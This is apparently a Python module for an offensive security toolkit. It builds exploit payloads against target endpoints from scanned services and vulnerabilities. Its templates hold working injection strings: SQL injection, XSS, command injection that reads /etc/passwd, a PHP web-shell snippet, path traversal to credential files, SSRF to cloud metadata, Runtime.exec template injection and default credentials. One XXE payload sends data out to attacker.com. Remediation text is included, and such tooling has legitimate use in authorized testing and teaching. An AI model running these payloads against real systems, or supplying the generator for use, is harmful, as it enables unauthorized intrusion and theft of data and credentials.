"""
Exploit Generator - Creates custom exploits based on discovered vulnerabilities.
Analyzes system weaknesses and crafts targeted exploits dynamically.
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum
import random
import re


class ExploitType(str, Enum):
    """Types of exploits that can be generated"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    SSRF = "ssrf"
    XXE = "xxe"
    DESERIALIZATION = "deserialization"
    TEMPLATE_INJECTION = "template_injection"


@dataclass
class Exploit:
    """Represents a generated exploit"""
    exploit_type: ExploitType
    payload: str
    target_endpoint: str
    target_parameter: Optional[str] = None
    description: str = ""
    success_probability: float = 0.0
    impact: str = "low"  # low, medium, high, critical
    prerequisites: List[str] = None
    detection_method: str = ""
    remediation: str = ""
    vulnerability_analysis: str = ""
    system_weakness: str = ""

    def __post_init__(self):
        if self.prerequisites is None:
            self.prerequisites = []


class ExploitGenerator:
    """
    Generates custom exploits based on discovered vulnerabilities and system analysis.
    Creates targeted payloads that adapt to the specific system configuration.
    """

    def __init__(self):
        """Initialize exploit generator"""
        self.generated_exploits = []
        self.exploit_templates = self._load_exploit_templates()
        self.system_analysis = {}

    def _load_exploit_templates(self) -> Dict[ExploitType, List[Dict]]:
        """Load exploit templates for different vulnerability types"""
        return {
            ExploitType.SQL_INJECTION: [
                {
                    "pattern": "UNION SELECT",
                    "payloads": [
                        "' UNION SELECT NULL--",
                        "' UNION SELECT 1,2,3--",
                        "' UNION SELECT username,password FROM users--",
                        "1' OR '1'='1",
                        "admin'--",
                        "' OR 1=1--"
                    ],
                    "detection": "SQL error messages, response time differences",
                    "analysis": "Database query construction allows user input concatenation"
                },
                {
                    "pattern": "Boolean-based",
                    "payloads": [
                        "' OR '1'='1'--",
                        "' OR 1=1#",
                        "') OR ('1'='1",
                        "1' AND '1'='1",
                        "admin' OR '1'='1"
                    ],
                    "detection": "Different responses for true/false conditions",
                    "analysis": "Authentication logic vulnerable to boolean manipulation"
                },
                {
                    "pattern": "Time-based",
                    "payloads": [
                        "'; WAITFOR DELAY '00:00:05'--",
                        "' OR SLEEP(5)--",
                        "'; SELECT pg_sleep(5)--",
                        "1'; SELECT BENCHMARK(5000000,MD5(1))--"
                    ],
                    "detection": "Response time delays indicate SQL execution",
                    "analysis": "Time-based blind SQL injection possible"
                }
            ],
            ExploitType.XSS: [
                {
                    "pattern": "Reflected XSS",
                    "payloads": [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "<svg onload=alert('XSS')>",
                        "javascript:alert('XSS')",
                        "<body onload=alert('XSS')>"
                    ],
                    "detection": "Script execution in browser, reflected in response",
                    "analysis": "User input reflected without proper encoding"
                },
                {
                    "pattern": "Stored XSS",
                    "payloads": [
                        "<script>document.cookie</script>",
                        "<iframe src=javascript:alert('XSS')>",
                        "<input onfocus=alert('XSS') autofocus>"
                    ],
                    "detection": "Persistent script storage and execution",
                    "analysis": "User input stored and rendered without sanitization"
                },
                {
                    "pattern": "DOM-based XSS",
                    "payloads": [
                        "#<img src=x onerror=alert('XSS')>",
                        "?name=<script>alert('XSS')</script>",
                        "#javascript:alert('XSS')"
                    ],
                    "detection": "DOM manipulation without validation",
                    "analysis": "Client-side code manipulates DOM with untrusted input"
                }
            ],
            ExploitType.COMMAND_INJECTION: [
                {
                    "pattern": "OS Command Injection",
                    "payloads": [
                        "; ls -la",
                        "| whoami",
                        "& cat /etc/passwd",
                        "`id`",
                        "$(uname -a)",
                        "|| ping -c 3 127.0.0.1"
                    ],
                    "detection": "Command execution, system information disclosure",
                    "analysis": "System commands executed with user-controlled input"
                },
                {
                    "pattern": "Code Injection",
                    "payloads": [
                        "; python -c 'import os; os.system(\"whoami\")'",
                        "| php -r 'system($_GET[\"cmd\"]);'",
                        "& node -e 'require(\"child_process\").exec(\"whoami\")'"
                    ],
                    "detection": "Code execution in application context",
                    "analysis": "Dynamic code evaluation with user input"
                }
            ],
            ExploitType.PATH_TRAVERSAL: [
                {
                    "pattern": "Directory Traversal",
                    "payloads": [
                        "../../../etc/passwd",
                        "..\\..\\..\\windows\\system32\\config\\sam",
                        "....//....//etc/passwd",
                        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                        "..%2f..%2f..%2fetc%2fpasswd"
                    ],
                    "detection": "Access to files outside intended directory",
                    "analysis": "File path validation insufficient, allows directory navigation"
                },
                {
                    "pattern": "Zip Slip",
                    "payloads": [
                        "../../../etc/passwd",
                        "..\\..\\..\\windows\\system32\\config\\sam"
                    ],
                    "detection": "Archive extraction to arbitrary locations",
                    "analysis": "Archive extraction without path validation"
                }
            ],
            ExploitType.AUTHENTICATION_BYPASS: [
                {
                    "pattern": "SQL Injection in Login",
                    "payloads": [
                        "admin'--",
                        "' OR '1'='1",
                        "admin' OR '1'='1'--",
                        "' OR 1=1#",
                        "') OR ('1'='1"
                    ],
                    "detection": "Successful login without valid credentials",
                    "analysis": "Authentication query vulnerable to SQL injection"
                },
                {
                    "pattern": "Weak Session Management",
                    "payloads": [
                        "session_id=admin",
                        "user_id=1",
                        "role=administrator"
                    ],
                    "detection": "Session manipulation grants unauthorized access",
                    "analysis": "Session tokens predictable or insufficiently protected"
                },
                {
                    "pattern": "Default Credentials",
                    "payloads": [
                        "admin:admin",
                        "admin:password",
                        "root:root"
                    ],
                    "detection": "Default credentials still active",
                    "analysis": "System uses default or weak credentials"
                }
            ],
            ExploitType.PRIVILEGE_ESCALATION: [
                {
                    "pattern": "IDOR",
                    "payloads": [
                        "?user_id=1",
                        "?id=0",
                        "?account_id=admin"
                    ],
                    "detection": "Access to resources belonging to other users",
                    "analysis": "Insecure direct object references allow privilege escalation"
                },
                {
                    "pattern": "Parameter Tampering",
                    "payloads": [
                        "role=admin",
                        "is_admin=true",
                        "privilege_level=999"
                    ],
                    "detection": "Elevated privileges through parameter manipulation",
                    "analysis": "Client-side parameters control authorization"
                }
            ],
            ExploitType.SSRF: [
                {
                    "pattern": "Server-Side Request Forgery",
                    "payloads": [
                        "http://127.0.0.1:22",
                        "http://localhost/admin",
                        "file:///etc/passwd",
                        "gopher://127.0.0.1:6379",
                        "http://169.254.169.254/latest/meta-data/"
                    ],
                    "detection": "Server makes requests to internal resources",
                    "analysis": "Server requests user-controlled URLs without validation"
                }
            ],
            ExploitType.XXE: [
                {
                    "pattern": "XML External Entity",
                    "payloads": [
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><foo>&xxe;</foo>'
                    ],
                    "detection": "External entity resolution, file disclosure",
                    "analysis": "XML parser resolves external entities without restrictions"
                }
            ],
            ExploitType.DESERIALIZATION: [
                {
                    "pattern": "Insecure Deserialization",
                    "payloads": [
                        'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
                        '{"__type":"System.Windows.Data.ObjectDataProvider"}'
                    ],
                    "detection": "Code execution during deserialization",
                    "analysis": "Deserialization of untrusted data without validation"
                }
            ],
            ExploitType.TEMPLATE_INJECTION: [
                {
                    "pattern": "Server-Side Template Injection",
                    "payloads": [
                        "{{7*7}}",
                        "${7*7}",
                        "#{7*7}",
                        "${T(java.lang.Runtime).getRuntime().exec('whoami')}"
                    ],
                    "detection": "Template code execution",
                    "analysis": "User input processed as template code"
                }
            ]
        }

    def analyze_system(self, target: str, services: List[Dict], vulnerabilities: List[Dict]) -> Dict:
        """
        Analyze system to identify weaknesses and potential exploit vectors.
        
        Args:
            target: Target hostname or IP
            services: List of discovered services
            vulnerabilities: List of discovered vulnerabilities
            
        Returns:
            System analysis dictionary
        """
        analysis = {
            "target": target,
            "services": services,
            "vulnerabilities": vulnerabilities,
            "weaknesses": [],
            "exploit_vectors": [],
            "risk_level": "low"
        }

        # Analyze services for common weaknesses
        for service in services:
            service_name = service.get("name", "").upper()
            port = service.get("port", 0)
            
            # Database services
            if any(db in service_name for db in ["MYSQL", "POSTGRESQL", "MONGODB", "REDIS"]):
                analysis["weaknesses"].append({
                    "type": "database_exposure",
                    "service": service_name,
                    "port": port,
                    "issue": f"{service_name} exposed on port {port} - potential SQL injection or unauthorized access"
                })
                analysis["exploit_vectors"].append(ExploitType.SQL_INJECTION)

            # Web services
            if service_name in ["HTTP", "HTTPS"]:
                analysis["weaknesses"].append({
                    "type": "web_application",
                    "service": service_name,
                    "port": port,
                    "issue": f"Web application on port {port} - potential XSS, SQL injection, or authentication bypass"
                })
                analysis["exploit_vectors"].extend([
                    ExploitType.XSS,
                    ExploitType.SQL_INJECTION,
                    ExploitType.AUTHENTICATION_BYPASS
                ])

            # File services
            if service_name in ["FTP", "SMB"]:
                analysis["weaknesses"].append({
                    "type": "file_service",
                    "service": service_name,
                    "port": port,
                    "issue": f"{service_name} on port {port} - potential path traversal or unauthorized file access"
                })
                analysis["exploit_vectors"].append(ExploitType.PATH_TRAVERSAL)

        # Analyze vulnerabilities for exploit opportunities
        for vuln in vulnerabilities:
            vuln_name = vuln.get("name", "").lower()
            severity = vuln.get("severity", "low")
            
            # Map vulnerability names to exploit types
            if "sql injection" in vuln_name:
                analysis["exploit_vectors"].append(ExploitType.SQL_INJECTION)
                analysis["weaknesses"].append({
                    "type": "sql_injection",
                    "vulnerability": vuln_name,
                    "issue": vuln.get("description", ""),
                    "severity": severity
                })
            elif "xss" in vuln_name or "cross-site scripting" in vuln_name:
                analysis["exploit_vectors"].append(ExploitType.XSS)
            elif "path traversal" in vuln_name or "directory traversal" in vuln_name:
                analysis["exploit_vectors"].append(ExploitType.PATH_TRAVERSAL)
            elif "command injection" in vuln_name:
                analysis["exploit_vectors"].append(ExploitType.COMMAND_INJECTION)
            elif "authentication" in vuln_name or "bypass" in vuln_name:
                analysis["exploit_vectors"].append(ExploitType.AUTHENTICATION_BYPASS)

        # Calculate risk level
        if any(v.get("severity") == "critical" for v in vulnerabilities):
            analysis["risk_level"] = "critical"
        elif any(v.get("severity") == "high" for v in vulnerabilities):
            analysis["risk_level"] = "high"
        elif any(v.get("severity") == "medium" for v in vulnerabilities):
            analysis["risk_level"] = "medium"

        self.system_analysis[target] = analysis
        return analysis

    def generate_exploit(
        self,
        exploit_type: ExploitType,
        target_endpoint: str,
        target_parameter: Optional[str] = None,
        system_info: Optional[Dict] = None
    ) -> Exploit:
        """
        Generate a custom exploit based on vulnerability type and system information.
        
        Args:
            exploit_type: Type of exploit to generate
            target_endpoint: Target endpoint URL
            target_parameter: Parameter name to exploit
            system_info: System information for targeted exploit generation
            
        Returns:
            Generated Exploit object
        """
        if exploit_type not in self.exploit_templates:
            raise ValueError(f"Unknown exploit type: {exploit_type}")

        templates = self.exploit_templates[exploit_type]
        
        # Select template based on system info if available
        if system_info:
            template = self._select_best_template(templates, system_info)
        else:
            template = random.choice(templates)

        # Select or craft payload
        if template["payloads"]:
            base_payload = random.choice(template["payloads"])
        else:
            base_payload = self._craft_payload(exploit_type, system_info)

        # Adapt payload to target
        payload = self._adapt_payload(base_payload, target_endpoint, target_parameter, system_info)

        # Calculate success probability
        success_prob = self._calculate_success_probability(exploit_type, system_info)

        # Determine impact
        impact = self._determine_impact(exploit_type, system_info)

        # Generate description
        description = self._generate_description(exploit_type, payload, target_endpoint)

        # Generate remediation
        remediation = self._generate_remediation(exploit_type)

        # Analyze vulnerability
        vulnerability_analysis = template.get("analysis", "")
        system_weakness = self._identify_system_weakness(exploit_type, system_info)

        exploit = Exploit(
            exploit_type=exploit_type,
            payload=payload,
            target_endpoint=target_endpoint,
            target_parameter=target_parameter,
            description=description,
            success_probability=success_prob,
            impact=impact,
            detection_method=template.get("detection", ""),
            remediation=remediation,
            vulnerability_analysis=vulnerability_analysis,
            system_weakness=system_weakness
        )

        self.generated_exploits.append(exploit)
        return exploit

    def generate_exploits_for_vulnerability(
        self,
        vulnerability: Dict,
        target_endpoint: str,
        system_analysis: Optional[Dict] = None
    ) -> List[Exploit]:
        """
        Generate multiple exploits for a discovered vulnerability.
        
        Args:
            vulnerability: Vulnerability information
            target_endpoint: Target endpoint
            system_analysis: System analysis results
            
        Returns:
            List of generated exploits
        """
        exploits = []
        vuln_name = vulnerability.get("name", "").lower()
        affected_service = vulnerability.get("affected_service", "")

        # Map vulnerability to exploit types
        exploit_types = []
        if "sql injection" in vuln_name:
            exploit_types.append(ExploitType.SQL_INJECTION)
        elif "xss" in vuln_name or "cross-site scripting" in vuln_name:
            exploit_types.append(ExploitType.XSS)
        elif "path traversal" in vuln_name:
            exploit_types.append(ExploitType.PATH_TRAVERSAL)
        elif "command injection" in vuln_name:
            exploit_types.append(ExploitType.COMMAND_INJECTION)
        elif "authentication" in vuln_name or "bypass" in vuln_name:
            exploit_types.append(ExploitType.AUTHENTICATION_BYPASS)

        # Generate exploits for each type
        for exploit_type in exploit_types:
            # Generate multiple variants
            for i in range(2):  # Generate 2 variants per type
                exploit = self.generate_exploit(
                    exploit_type=exploit_type,
                    target_endpoint=target_endpoint,
                    target_parameter=self._infer_parameter(affected_service, exploit_type),
                    system_info=system_analysis
                )
                exploits.append(exploit)

        return exploits

    def _select_best_template(self, templates: List[Dict], system_info: Dict) -> Dict:
        """Select best template based on system information"""
        # For now, return random template
        # In production, would analyze system to select most appropriate
        return random.choice(templates)

    def _craft_payload(self, exploit_type: ExploitType, system_info: Optional[Dict]) -> str:
        """Craft custom payload based on exploit type and system info"""
        if exploit_type == ExploitType.SQL_INJECTION:
            return "' OR 1=1--"
        elif exploit_type == ExploitType.XSS:
            return "<script>alert('XSS')</script>"
        elif exploit_type == ExploitType.COMMAND_INJECTION:
            return "; whoami"
        elif exploit_type == ExploitType.PATH_TRAVERSAL:
            return "../../../etc/passwd"
        else:
            return "test_payload"

    def _adapt_payload(
        self,
        payload: str,
        endpoint: str,
        parameter: Optional[str],
        system_info: Optional[Dict]
    ) -> str:
        """Adapt payload to specific target endpoint and parameter"""
        # If parameter provided, format payload for that parameter
        if parameter:
            # For GET requests
            if "?" in endpoint or endpoint.endswith("/"):
                return f"{endpoint}?{parameter}={payload}"
            else:
                return f"{endpoint}?{parameter}={payload}"
        
        return payload

    def _calculate_success_probability(
        self,
        exploit_type: ExploitType,
        system_info: Optional[Dict]
    ) -> float:
        """Calculate success probability based on exploit type and system info"""
        base_probabilities = {
            ExploitType.SQL_INJECTION: 0.6,
            ExploitType.XSS: 0.7,
            ExploitType.COMMAND_INJECTION: 0.5,
            ExploitType.PATH_TRAVERSAL: 0.6,
            ExploitType.AUTHENTICATION_BYPASS: 0.4,
            ExploitType.PRIVILEGE_ESCALATION: 0.3,
            ExploitType.SSRF: 0.5,
            ExploitType.XXE: 0.4,
            ExploitType.DESERIALIZATION: 0.3,
            ExploitType.TEMPLATE_INJECTION: 0.5
        }

        base_prob = base_probabilities.get(exploit_type, 0.5)

        # Adjust based on system info
        if system_info:
            risk_level = system_info.get("risk_level", "low")
            if risk_level == "critical":
                base_prob += 0.2
            elif risk_level == "high":
                base_prob += 0.1

        return min(base_prob, 0.95)

    def _determine_impact(
        self,
        exploit_type: ExploitType,
        system_info: Optional[Dict]
    ) -> str:
        """Determine impact level of exploit"""
        high_impact_types = [
            ExploitType.SQL_INJECTION,
            ExploitType.COMMAND_INJECTION,
            ExploitType.PRIVILEGE_ESCALATION,
            ExploitType.DESERIALIZATION
        ]

        if exploit_type in high_impact_types:
            return "high"
        elif exploit_type in [ExploitType.XSS, ExploitType.AUTHENTICATION_BYPASS]:
            return "medium"
        else:
            return "low"

    def _generate_description(
        self,
        exploit_type: ExploitType,
        payload: str,
        endpoint: str
    ) -> str:
        """Generate human-readable description of exploit"""
        descriptions = {
            ExploitType.SQL_INJECTION: f"SQL injection exploit targeting {endpoint} with payload designed to extract database information or bypass authentication",
            ExploitType.XSS: f"Cross-site scripting exploit for {endpoint} that executes malicious JavaScript in victim's browser",
            ExploitType.COMMAND_INJECTION: f"Command injection exploit on {endpoint} allowing execution of arbitrary system commands",
            ExploitType.PATH_TRAVERSAL: f"Path traversal exploit targeting {endpoint} to access files outside intended directory",
            ExploitType.AUTHENTICATION_BYPASS: f"Authentication bypass exploit for {endpoint} allowing unauthorized access",
            ExploitType.PRIVILEGE_ESCALATION: f"Privilege escalation exploit on {endpoint} to gain elevated permissions",
            ExploitType.SSRF: f"Server-side request forgery exploit on {endpoint} to make server request internal resources",
            ExploitType.XXE: f"XML external entity exploit on {endpoint} to read local files or perform SSRF",
            ExploitType.DESERIALIZATION: f"Insecure deserialization exploit on {endpoint} leading to remote code execution",
            ExploitType.TEMPLATE_INJECTION: f"Template injection exploit on {endpoint} allowing server-side code execution"
        }

        return descriptions.get(exploit_type, f"Exploit targeting {endpoint}")

    def _generate_remediation(self, exploit_type: ExploitType) -> str:
        """Generate remediation advice for exploit type"""
        remediations = {
            ExploitType.SQL_INJECTION: "Use parameterized queries/prepared statements. Validate and sanitize all user input. Implement least privilege database access.",
            ExploitType.XSS: "Implement output encoding (HTML entity encoding, JavaScript encoding). Use Content Security Policy (CSP). Validate and sanitize all user input.",
            ExploitType.COMMAND_INJECTION: "Avoid executing system commands with user input. Use safe APIs and parameterized commands. Implement input validation and whitelisting.",
            ExploitType.PATH_TRAVERSAL: "Validate and sanitize file paths. Use path canonicalization. Implement proper access controls. Use chroot jails when possible.",
            ExploitType.AUTHENTICATION_BYPASS: "Use secure authentication mechanisms. Implement proper session management. Validate all authentication inputs. Use multi-factor authentication.",
            ExploitType.PRIVILEGE_ESCALATION: "Implement proper authorization checks. Use role-based access control (RBAC). Validate user permissions on every request.",
            ExploitType.SSRF: "Validate and whitelist URLs. Block internal IP ranges. Use network segmentation. Implement proper URL parsing.",
            ExploitType.XXE: "Disable XML external entity processing. Use simpler data formats (JSON). Validate XML schemas. Use whitelisting for XML parsers.",
            ExploitType.DESERIALIZATION: "Avoid deserializing untrusted data. Use safe serialization formats. Implement integrity checks. Use deserialization with limited privileges.",
            ExploitType.TEMPLATE_INJECTION: "Use logic-less templates. Sandbox template execution. Validate and sanitize template inputs. Implement template access controls."
        }

        return remediations.get(exploit_type, "Implement proper input validation and output encoding.")

    def _identify_system_weakness(
        self,
        exploit_type: ExploitType,
        system_info: Optional[Dict]
    ) -> str:
        """Identify specific system weakness that enables this exploit"""
        weaknesses = {
            ExploitType.SQL_INJECTION: "System constructs database queries by concatenating user input without proper sanitization or parameterization",
            ExploitType.XSS: "System reflects or stores user input without proper encoding, allowing script execution in browser context",
            ExploitType.COMMAND_INJECTION: "System executes commands or code with user-controlled input without validation",
            ExploitType.PATH_TRAVERSAL: "System processes file paths without proper validation, allowing directory navigation",
            ExploitType.AUTHENTICATION_BYPASS: "System authentication logic has flaws allowing unauthorized access through input manipulation",
            ExploitType.PRIVILEGE_ESCALATION: "System authorization checks are insufficient or can be bypassed through parameter manipulation",
            ExploitType.SSRF: "System makes HTTP requests based on user-controlled URLs without proper validation",
            ExploitType.XXE: "XML parser configuration allows external entity resolution without restrictions",
            ExploitType.DESERIALIZATION: "System deserializes data without proper validation or in unsafe context",
            ExploitType.TEMPLATE_INJECTION: "Template engine processes user input as code without proper sandboxing"
        }

        base_weakness = weaknesses.get(exploit_type, "System vulnerability allows exploitation")

        if system_info:
            services = system_info.get("services", [])
            if services:
                service_names = [s.get("name", "") for s in services]
                base_weakness += f". Affected services: {', '.join(service_names)}"

        return base_weakness

    def _infer_parameter(self, service: str, exploit_type: ExploitType) -> str:
        """Infer likely parameter name based on service and exploit type"""
        if exploit_type == ExploitType.SQL_INJECTION:
            return "id" if "database" in service.lower() else "username"
        elif exploit_type == ExploitType.XSS:
            return "search" if "web" in service.lower() else "name"
        elif exploit_type == ExploitType.PATH_TRAVERSAL:
            return "file" if "file" in service.lower() else "path"
        else:
            return "input"

    def get_generated_exploits(self) -> List[Exploit]:
        """Get all generated exploits"""
        return self.generated_exploits

    def get_exploits_for_target(self, target: str) -> List[Exploit]:
        """Get exploits generated for specific target"""
        return [e for e in self.generated_exploits if target in e.target_endpoint]

